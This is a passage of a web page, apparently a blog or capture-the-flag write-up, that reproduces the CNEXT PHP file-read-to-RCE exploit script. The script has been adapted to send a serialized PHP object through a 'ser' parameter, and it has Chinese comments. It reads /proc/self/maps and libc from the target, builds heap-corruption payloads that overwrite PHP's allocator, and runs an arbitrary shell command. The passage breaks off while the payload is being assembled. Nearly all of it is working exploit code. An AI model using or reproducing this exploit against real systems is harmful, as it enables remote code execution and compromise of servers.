class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE</span></span><br><span class="line"><span class="comment"># Date: 2024-05-27</span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># INFORMATIONS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># REQUIREMENTS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Requires ten: https://github.com/cfreal/ten</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError</span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment"># # 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># # 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@entry</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep_time&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@arg(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)</span></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    url: <span class="built_in">str</span></span><br><span class="line">    command: <span class="built_in">str</span></span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span></span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span></span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.remote = Remote(self.url)</span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)</span><br><span class="line">        self.info = &#123;&#125;</span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rep=self.remote.download(path)</span><br><span class="line">                <span class="keyword">return</span> rep</span><br><span class="line">            <span class="keyword">except</span> ConnectionError:</span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">            result = safe_download(path)</span><br><span class="line">            <span class="keyword">return</span> text.encode() == result</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()</span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        result = safe_download(path)</span><br><span class="line">        <span class="comment">#print(base64.encode(result))</span></span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)</span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)</span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()</span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):</span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span></span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">        maps = maps.decode()</span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span></span><br><span class="line">        )</span><br><span class="line">        regions = []</span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):</span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)</span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    path = <span class="string">&quot;&quot;</span></span><br><span class="line">                current = Region(start, stop, permissions, path)</span><br><span class="line">                regions.append(current)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(maps)</span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> regions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span></span><br><span class="line">        regions = self.get_regions()</span><br><span class="line"></span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># PHP&#x27;s heap</span></span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Libc</span></span><br><span class="line"></span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)</span><br><span class="line"></span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)</span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span></span><br><span class="line">        data = self.get_file(remote_path)</span><br><span class="line">        Path(local_path).write(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:</span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a</span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.</span></span><br><span class="line">        heaps = [</span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span></span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)</span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span></span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE</span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line">            <span class="keyword">and</span> region.path == <span class="string">&quot;&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:</span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">        first = heaps[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:</span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))</span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.check_vulnerable()</span><br><span class="line">        self.get_symbols_and_addresses()</span><br><span class="line">        self.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"></span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span></span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">        step1_size = <span class="number">1</span></span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1, CS)</span><br><span class="line">        step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">        step2_size = <span class="number">0x48</span></span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">        step2 = chunked_chunk(step2, CS)</span><br><span class="line">        step2 = chunked_chunk(step2)</span><br><span class="line">        step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">        step3_size = CS</span><br><span class="line"></span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">        step4_size = CS</span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">        step4_pwn = ptr_bucket(</span><br><span class="line">            <span class="number">0x200000</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># free_slot</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            size=CS,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_custom_heap = ptr_bucket(</span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">        COMMAND = self.command</span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.sleep:</span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> (</span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap = COMMAND</span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">        pages = (</span><br><span class="line">                step4 * <span class="number">3</span></span><br><span class="line">                + step4_pwn</span><br><span class="line">                + step4_custom_heap</span><br><span class="line">                + step4_use_custom_heap</span><br><span class="line">                + step3_overflow</span><br><span class="line">                + pad * self.pad</span><br><span class="line">                + step1 * <span class="number">3</span></span><br><span class="line">                + step2_write_ptr</span><br><span class="line">                + step2 * <span class="number">2</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resource = compress(compress(pages))</span><br><span class="line">        resource = b64(resource)</span><br><span class="line">        